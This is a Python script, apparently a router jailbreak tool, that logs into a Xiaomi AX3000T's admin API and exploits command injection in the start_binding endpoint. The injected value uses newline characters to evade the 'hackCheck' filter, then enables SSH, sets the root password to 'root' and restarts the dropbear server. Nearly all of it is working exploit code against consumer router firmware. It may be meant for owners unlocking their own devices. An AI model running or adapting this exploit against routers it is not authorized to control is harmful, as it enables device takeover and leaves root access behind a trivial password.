#!/usr/bin/env python3
"""通过 start_binding 命令注入开启 AX3000T SSH"""

import hashlib
import random
import time
import urllib.request
import urllib.parse
import json
import sys
import socket
import argparse

KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


def sha256(s: str) -> str:
    return hashlib.sha256(s.encode('utf-8')).hexdigest()


def nonce() -> str:
    return f"0__{int(time.time())}_{random.randint(0, 9999)}"


def login(ip: str, pwd: str) -> str:
    n = nonce()
    data = urllib.parse.urlencode({
        "username": "admin",
        "password": sha256(n + sha256(pwd + KEY)),
        "logtype": "2",
        "nonce": n,
    }).encode()
    req = urllib.request.Request(f"http://{ip}/cgi-bin/luci/api/xqsystem/login", data=data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    r = json.loads(urllib.request.urlopen(req, timeout=10).read())
    if r.get('code') != 0:
        raise Exception(f"登录失败: {r}")
    return r['token']


def wait_ssh(ip: str, timeout: int = 60) -> dict:
    """等待 SSH 端口就绪"""
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.create_connection((ip, 22), timeout=2)
            s.close()
            return {"ssh_ok": True, "elapsed_sec": int(time.time() - start)}
        except (OSError, socket.timeout):
            time.sleep(2)
    return {"ssh_ok": False, "elapsed_sec": timeout}


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='通过 start_binding 命令注入开启 AX3000T SSH')
    parser.add_argument('--stok', help='已登录的 stok')
    parser.add_argument('--ip', default='192.168.31.1', help='路由器 IP (默认: 192.168.31.1)')
    parser.add_argument('--pwd', help='管理密码 (不传 --stok 时使用)')
    parser.add_argument('--wait', action='store_true', help='等待 SSH 端口就绪')
    args = parser.parse_args()

    stok = args.stok
    if not stok:
        if not args.pwd:
            args.pwd = input('管理密码: ')
        stok = login(args.ip, args.pwd)

    # start_binding 注入：所有 ; 替换为 \n 绕过 hackCheck
    items = [
        r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
        r"nvram set ssh_en=1",
        r"nvram set boot_wait=on",
        r"nvram commit",
        r"echo -e 'root\nroot' > /tmp/psw.txt",
        r"passwd root < /tmp/psw.txt",
        r"/etc/init.d/dropbear enable",
        r"/etc/init.d/dropbear restart",
    ]
    cmds = "\n".join(items)
    key = "1234' -X \n" + cmds + "\n logger -t X 'X"
    params = {'uid': '1234', 'key': key}

    url = f"http://{args.ip}/cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding"
    print(json.dumps({"status": "发送注入请求…"}), file=sys.stderr)

    query = urllib.parse.urlencode(params)
    try:
        r = json.loads(urllib.request.urlopen(url + '?' + query, timeout=15).read())
    except Exception as e:
        r = {"code": 0, "_note": str(e)}

    result = {"stok": stok}
    if r.get('code') == 0:
        result["inject_ok"] = True
        result["msg"] = "注入已发送，SSH 正在启动…"
    else:
        result["inject_ok"] = False
        result["error"] = f"注入失败: {r}"
        print(json.dumps(result, ensure_ascii=False))
        sys.exit(1)

    if args.wait:
        check = wait_ssh(args.ip)
        result["ssh_ok"] = check["ssh_ok"]
        result["elapsed_sec"] = check["elapsed_sec"]
        if not check["ssh_ok"]:
            result["error"] = "SSH 未就绪"
            print(json.dumps(result, ensure_ascii=False))
            sys.exit(1)
    else:
        result["ssh_ok"] = False
        result["msg"] += "（加 --wait 等待 SSH 就绪）"

    result["ssh_user"] = "root"
    result["ssh_pwd"] = "root"
    print(json.dumps(result, ensure_ascii=False))
